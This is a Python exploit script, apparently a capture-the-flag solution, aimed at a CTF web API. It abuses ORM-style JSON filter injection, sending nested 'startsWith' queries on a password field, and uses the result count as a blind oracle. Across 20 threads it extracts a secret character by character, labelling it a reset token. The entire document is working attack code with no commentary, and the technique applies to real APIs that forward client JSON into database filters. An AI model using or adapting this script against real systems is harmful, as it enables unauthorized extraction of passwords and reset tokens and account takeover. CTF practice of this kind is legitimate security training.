import requests, string, sys
import urllib.parse as urlparse
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://onlyparks2.c.unitedctf.ca/api/article"
CHARS = string.ascii_letters + string.digits + '-'  # Inclut les minuscules, majuscules, chiffres et le caractère '-'
THREADS = 20

def worker(test_substring_value: str) -> tuple[bool, str]:
    body = {
        "clowns": {
            "some": {
                "clown": {
                    "password": {
                        "startsWith": test_substring_value
                    }
                }
            }
        }
    }
    r = requests.post(TARGET, json=body)
    r_json: dict = r.json()
    return len(r_json.get('results', [])) > 0, test_substring_value

def main():
    dumped_value = ""
    print(f"\r{Fore.RED}dumped resetToken: {Fore.YELLOW}{Style.BRIGHT}{dumped_value}{Style.RESET_ALL}", end="")
    sys.stdout.flush()
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = executor.map(worker, [dumped_value + test_char for test_char in CHARS])

            for result in futures:
                was_success = result[0]
                test_substring = result[1]
                if was_success:
                    dumped_value += test_substring[-1]
                    print(f"\r{Fore.RED}dumped resetToken: {Fore.YELLOW}{Style.BRIGHT}{dumped_value}{Style.RESET_ALL}", end="")
                    sys.stdout.flush()
                    found = True
                    break
        if not found:
            print("\nNo more characters found, stopping.")
            break

if __name__ == "__main__":
    main()